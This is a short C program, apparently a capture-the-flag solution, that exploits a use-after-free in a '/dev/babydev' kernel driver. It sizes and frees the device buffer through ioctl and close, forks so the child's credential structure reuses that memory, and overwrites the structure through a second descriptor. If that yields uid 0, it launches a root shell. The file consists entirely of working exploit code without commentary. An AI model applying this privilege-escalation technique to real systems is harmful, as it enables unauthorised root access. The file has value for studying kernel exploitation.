#include<stdio.h>
#include<fcntl.h>
#include<unistd.h>
int main(){
    int fd1,fd2,id;
    char cred[0xa8]={0};
    fd1=open("/dev/babydev",O_RDWR);
    fd2=open("/dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0xa8);
    close(fd1);
    id=fork();
    if(id<0){
        printf("\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n");
        return -1;
    }else if(id==0){
        write(fd2,cred,28);
        if(getuid()==0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }else{
            printf("failed!\n");
            return -1;
        }
    }else {
        wait(NULL);
    }
    close(fd2);
}
